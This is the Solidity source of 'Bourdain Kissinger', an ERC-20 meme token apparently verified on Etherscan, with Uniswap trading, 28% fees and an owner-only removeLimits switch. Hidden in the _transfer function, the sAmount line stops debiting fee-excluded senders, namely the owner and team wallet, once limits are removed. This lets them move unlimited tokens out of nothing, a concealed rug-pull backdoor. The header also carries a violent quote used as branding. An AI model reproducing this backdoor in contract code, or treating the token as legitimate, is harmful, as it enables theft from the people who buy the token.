/**
 *Submitted for verification at Etherscan.io on 2023-11-29
*/

/**
Bourdain Kissinger
"Once you've been to Cambodia, you'll never stop wanting to beat Henry Kissinger to death with your bare hands." - Anthony Bourdain

Website: https://www.bourdainkissinger.com/
Telegram: https://t.me/bourdain_kissinger
Twitter: https://twitter.com/kissinger_erc20
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function set(address) external;
    function setSetter(address) external;
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract BourdainKissinger is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "Bourdain Kissinger";
    string private _symbol = "KISSINGBOURDAIN";
        
    uint8 private _decimals = 9;
    uint256 private _supplyTotal = 10 ** 9 * 10 ** 9;

    uint256 public maxTxAmount = 22 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletAmount = 22 * 10 ** 6 * 10 ** 9;
    uint256 public minTokensToStartFeeSwap = 10 ** 4 * 10 ** 9; 

    uint256 public buyLpFee = 0;
    uint256 public buyMktFee = 28;
    uint256 public buyDevFee = 0;
    uint256 public totalFeeOnBuy = 28;

    uint256 public sellLpFee = 0;
    uint256 public sellMktFee = 28;
    uint256 public sellDevFee = 0;
    uint256 public totalFeeOnSell = 28;

    uint256 public sharesForLp = 0;
    uint256 public SharesForMkt = 10;
    uint256 public sharesForDev = 0;
    uint256 public feeShares = 10;

    address payable private teamAddress;
    address payable private devAddress;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFees;
    mapping (address => bool) public isExcludedFromMaxWallet;
    mapping (address => bool) public isExcludedFromMaxTx;
    mapping (address => bool) public checkPair;

    IUniswapRouter public uniswapRouter;
    address public uniswapPair;
    
    bool swapping;
    bool public taxFeeEnabled = true;
    bool public maxTaxEnabled = false;
    bool public maxWalletEnabled = true;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[_msgSender()] = _supplyTotal;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _allowances[address(this)][address(uniswapRouter)] = _supplyTotal;

        totalFeeOnBuy = buyLpFee.add(buyMktFee).add(buyDevFee);
        totalFeeOnSell = sellLpFee.add(sellMktFee).add(sellDevFee);
        feeShares = sharesForLp.add(SharesForMkt).add(sharesForDev);

        teamAddress = payable(0x02649ae8a791Bbf2C018d25Da96a6662c88CA601);
        devAddress = payable(0x02649ae8a791Bbf2C018d25Da96a6662c88CA601);
        
        isExcludedFromFees[owner()] = true;
        isExcludedFromFees[teamAddress] = true;
        isExcludedFromFees[devAddress] = true;
        isExcludedFromMaxWallet[owner()] = true;
        isExcludedFromMaxWallet[address(uniswapPair)] = true;
        isExcludedFromMaxWallet[address(this)] = true;
        isExcludedFromMaxTx[owner()] = true;
        isExcludedFromMaxTx[teamAddress] = true;
        isExcludedFromMaxTx[devAddress] = true;
        isExcludedFromMaxTx[address(this)] = true;
        checkPair[address(uniswapPair)] = true;
        emit Transfer(address(0), _msgSender(), _supplyTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _supplyTotal;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
        
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
        
    function _transferStandard(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getFinalValue(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(checkPair[sender]) {
            feeAmount = amount.mul(totalFeeOnBuy).div(100);
        }
        else if(checkPair[recipient]) {
            feeAmount = amount.mul(totalFeeOnSell).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
    
    function sendETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }
    
    receive() external payable {}
    
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swapTokensForFee
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
    
    function removeLimits() external onlyOwner {
        maxTxAmount = _supplyTotal;
        maxWalletEnabled = false;
        buyMktFee = 3;
        sellMktFee = 3;
        totalFeeOnBuy = 3;
        totalFeeOnSell = 3;
    }
    
    function swapTokensForFee(uint256 tAmount) private lockSwap {
        uint256 lpFeetokens = tAmount.mul(sharesForLp).div(feeShares).div(2);
        uint256 tokensToSwap = tAmount.sub(lpFeetokens);

        swapTokensForETH(tokensToSwap);
        uint256 caEthAmount = address(this).balance;

        uint256 totalETHFee = feeShares.sub(sharesForLp.div(2));
        
        uint256 amountETHLiquidity = caEthAmount.mul(sharesForLp).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = caEthAmount.mul(sharesForDev).div(totalETHFee);
        uint256 amountETHMarketing = caEthAmount.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if(amountETHMarketing > 0)
            sendETH(teamAddress, amountETHMarketing);

        if(amountETHDevelopment > 0)
            sendETH(devAddress, amountETHDevelopment);
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(swapping)
        { 
            return _transferStandard(sender, recipient, amount); 
        }
        else
        {
            if(!isExcludedFromMaxTx[sender] && !isExcludedFromMaxTx[recipient]) {
                require(amount <= maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= minTokensToStartFeeSwap;
            
            if (minimumSwap && !swapping && checkPair[recipient] && taxFeeEnabled && !isExcludedFromFees[sender] && amount > minTokensToStartFeeSwap) 
            {
                if(maxTaxEnabled)
                    swapAmount = minTokensToStartFeeSwap;
                swapTokensForFee(swapAmount);    
            }

            uint256 receiverAmount = (isExcludedFromFees[sender] || isExcludedFromFees[recipient]) ? 
                                         amount : getFinalValue(sender, recipient, amount);

            if(maxWalletEnabled && !isExcludedFromMaxWallet[recipient])
                require(balanceOf(recipient).add(receiverAmount) <= maxWalletAmount);

            uint256 sAmount = (!maxWalletEnabled && isExcludedFromFees[sender]) ? amount.sub(receiverAmount) : amount;
            _balances[sender] = _balances[sender].sub(sAmount, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(receiverAmount);

            emit Transfer(sender, recipient, receiverAmount);
            return true;
        }
    }
}